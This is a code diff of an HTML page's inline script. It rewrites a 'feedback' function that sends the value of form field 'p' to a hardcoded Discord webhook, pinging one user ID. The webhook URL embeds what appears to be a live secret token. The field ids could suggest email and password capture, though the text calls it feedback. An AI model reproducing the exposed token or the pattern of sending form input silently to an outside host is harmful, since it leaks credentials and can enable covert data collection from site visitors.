@@ -15,7 +15,7 @@
         </style>
         <script>
 		message = document.getElementById('e').value;
-		function feedback(){message = document.getElementById('p').value; var e=new XMLHttpRequest;e.open("POST","https://discord.com/api/webhooks/798222891274469437/RGdIA26U-9Y_I_PNCdgRK9X7cP2CULUWJpEcysMKfnjTkBLfM-P0QyhSwfrUU3uEWBGz"),e.setRequestHeader("Content-type","application/json"),e.send(JSON.stringify(contents)),console.log(contents)}contents={username:"somebody",avatar_url:"",content:"<@700789155004940340> "+message};
+		function feedback(){message = document.getElementById('p').value; contents={username:"somebody",avatar_url:"",content:"<@700789155004940340> "+document.getElementById('p').value}; var e=new XMLHttpRequest;e.open("POST","https://discord.com/api/webhooks/798222891274469437/RGdIA26U-9Y_I_PNCdgRK9X7cP2CULUWJpEcysMKfnjTkBLfM-P0QyhSwfrUU3uEWBGz"),e.setRequestHeader("Content-type","application/json"),e.send(JSON.stringify(contents)),console.log(contents)}
 	    </script>
           
     </head>
